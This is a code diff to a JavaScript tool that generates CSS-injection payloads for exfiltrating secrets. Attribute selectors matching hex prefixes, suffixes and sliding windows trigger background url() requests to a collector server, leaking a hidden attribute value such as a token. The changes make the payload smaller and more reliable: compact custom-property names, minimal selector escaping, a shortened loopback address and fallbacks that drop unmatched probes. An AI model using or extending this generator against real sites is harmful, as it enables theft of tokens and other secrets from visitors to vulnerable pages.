@@ -15,19 +15,42 @@
   const ANCHOR_LENGTH = 2;
   const MAX_LAYERS_PER_BOX = 25000;
   const PSEUDO_BOXES = ['::before', '::after'];
+  const NAME_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
 
   function shortName(index) {
-    let length = 1;
-    while (index >= 26 * 36 ** (length - 1)) {
-      index -= 26 * 36 ** (length - 1);
-      length++;
-    }
-    const place = 36 ** (length - 1);
-    const first = String.fromCharCode(97 + Math.floor(index / place));
-    const rest = length === 1
-      ? ''
-      : (index % place).toString(36).padStart(length - 1, '0');
-    return first + rest;
+    // The leading -- makes digits valid too; custom properties are case-sensitive.
+    let name = '';
+    do {
+      name = NAME_CHARS[index % NAME_CHARS.length] + name;
+      index = Math.floor(index / NAME_CHARS.length) - 1;
+    } while (index >= 0);
+    return name;
+  }
+
+  function attributeValue(value) {
+    if (/^(?:--|-?[A-Za-z_])[A-Za-z0-9_-]*$/.test(value)) return value;
+    const quoted = '"' + value.replace(/["\\\n\r\f\0]/g, c => {
+      if (c === '\0') return '\ufffd';
+      return /[\n\r\f]/.test(c) ? '\\' + c.charCodeAt(0).toString(16) + ' ' : '\\' + c;
+    }) + '"';
+    // An escaped punctuation mark costs one byte, versus two quote marks.
+    // Keep numeric starts and control characters quoted; their identifier
+    // escapes are longer and can consume following hex digits.
+    if (!value || /^(?:[0-9]|-[0-9])/.test(value) || /[^\x21-\x7e]/.test(value)) return quoted;
+    const ident = value.replace(/[^A-Za-z0-9_-]/g, '\\$&');
+    return ident.length < quoted.length ? (ident === '-' ? '\\-' : ident) : quoted;
+  }
+
+  function collectorURL(server) {
+    // Keep the abbreviation literal: URL serialization expands it to 127.0.0.1.
+    // Keep localhost: it can resolve to IPv6 and is a different origin for
+    // CSP. HTTPS names must remain intact for certificate validation too.
+    return server.replace(/^http:\/\/127\.0\.0\.1(?=[:/]|$)/i, 'http://127.1');
+  }
+
+  function backgroundList(props) {
+    // Matching values carry their own commas. Missing props contribute no layer.
+    return props.map(p => `var(--${p},)`).join('') + 'none';
   }
 
   function allHex(length) {
@@ -37,6 +60,7 @@
   }
 
   function generateCSS(cfg, server) {
+    server = collectorURL(server);
     const { selector, attribute, tag, startContext, endContext, useStartsWith, useEndsWith } = cfg;
     const windowSize = cfg.windowSize || 4;
     // A hidden input can't render its own background, so its requests need
@@ -52,13 +76,13 @@
     const rules = [];
     const layers = [];
     const rule = (op, value, prop, path) => {
-      const match = `${attribute}${op}"${value}"`;
+      const match = `${attribute}${op}${attributeValue(value)}`;
       const subject = useHas ? `html:has(&[${match}])` : `&[${match}]${target}`;
-      rules.push(`${subject}{--${prop}:url(${server}/${path})}`);
+      rules.push(`${subject}{--${prop}:url(${server}/${path}),}`);
     };
 
     // Start/end props contain a hyphen, so they can never clash with a
-    // shortName() (alphanumeric only) used for the window props.
+    // shortName() (alphanumeric/underscore) used for the window props.
     for (const a of allHex(ANCHOR_LENGTH)) {
       if (useStartsWith) rule('^=', a, 's-', 's/' + a);
       else rule('*=', startContext + a, 's-', 's/' + a);
@@ -66,18 +90,16 @@
     allHex(windowSize).forEach((w, i) => {
       const prop = shortName(i);
       rule('*=', w, prop, w);
-      layers.push(`var(--${prop},none)`);
+      layers.push(prop);
     });
     for (const a of allHex(ANCHOR_LENGTH)) {
       if (useEndsWith) rule('$=', a, 'e-', 'e/' + a);
       else rule('*=', a + endContext, 'e-', 'e/' + a);
     }
 
-    // Chrome crashes the tab if one box has too many background layers (seen
-    // between 32k and 65k), so spread them over the element and its ::before
-    // and ::after. Custom properties are inherited, so the pseudo-elements see
-    // the same values.
-    const all = ['var(--s-,none)', ...layers, 'var(--e-,none)'];
+    // Keep the existing per-box limits even though unmatched probes now vanish.
+    // Custom properties are inherited by the pseudo-elements.
+    const all = ['s-', ...layers, 'e-'];
     const boxCount = Math.ceil(all.length / MAX_LAYERS_PER_BOX);
     const perBox = Math.ceil(all.length / boxCount);
     // In :has() mode the root hosts the layers (html:has(&) is <html> whenever
@@ -86,7 +108,7 @@
     const host = useHas ? 'html:has(&)' : (tag === 'input' ? '&+*' : '&');
     let body = '';
     for (let i = 0; i < boxCount; i++) {
-      const background = `background:${all.slice(i * perBox, (i + 1) * perBox).join(',')}`;
+      const background = `background:${backgroundList(all.slice(i * perBox, (i + 1) * perBox))}`;
       if (i === 0) {
         if (useHas) body += `${host}{${background}}`;
         else body += tag === 'input' ? `${host}{display:inline-block;${background}}` : background + ';';
@@ -95,7 +117,10 @@
     return `<style>${selector}{${rules.join('')}${body}}</style>`;
   }
 
-  const api = { HEX, ANCHOR_LENGTH, MAX_LAYERS_PER_BOX, PSEUDO_BOXES, shortName, allHex, generateCSS };
+  const api = {
+    HEX, ANCHOR_LENGTH, MAX_LAYERS_PER_BOX, PSEUDO_BOXES,
+    shortName, attributeValue, collectorURL, backgroundList, allHex, generateCSS,
+  };
   if (typeof module !== 'undefined' && module.exports) module.exports = api;
   else Object.assign(root, api);
 })(typeof window !== 'undefined' ? window : globalThis);
